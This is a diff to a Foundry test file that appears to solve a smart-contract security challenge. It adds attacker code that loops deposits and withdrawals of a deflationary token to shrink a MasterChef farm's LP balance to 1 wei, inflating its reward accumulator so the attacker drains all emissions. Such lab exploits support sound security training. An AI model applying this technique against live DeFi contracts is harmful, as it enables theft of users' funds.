@@ -78,6 +78,22 @@ contract Testing is Test {
         vm.startPrank(attacker,attacker);
 
         // implement solution here
+        mula.approve(address(masterChef), type(uint).max);
+        // deposit and withdraw repeatly to reduce lptoken of MasterChef
+        while (true) {
+            uint256 amount = mula.balanceOf(attacker);
+            masterChef.deposit(0, amount);
+            uint256 chefAmount = mula.balanceOf(address(masterChef)) - 1;
+            if (chefAmount < amount) {
+                masterChef.withdraw(0, chefAmount);
+                // mula balance of masterChef is 1
+                break;
+            }            
+            masterChef.withdraw(0, amount);
+        }
+        (,,,uint256 accMunyPerShare) = masterChef.poolInfo(0);
+        emit log_named_decimal_uint("accMunyPerShare:", accMunyPerShare, 18);
+        emit log_named_decimal_uint("[masterChef]mula bal:", mula.balanceOf(address(masterChef)), 18);
 
         vm.stopPrank();
         validation();
@@ -90,7 +106,6 @@ contract Testing is Test {
         vm.roll(block.number+1);
         vm.prank(attacker);
         masterChef.deposit(0,1);
-
         // attacker drains all farm emissions up to this block
         assertEq(muny.balanceOf(attacker),120e18); // 1e18 per block for 120 blocks
         assertEq(muny.balanceOf(adminUser),0);
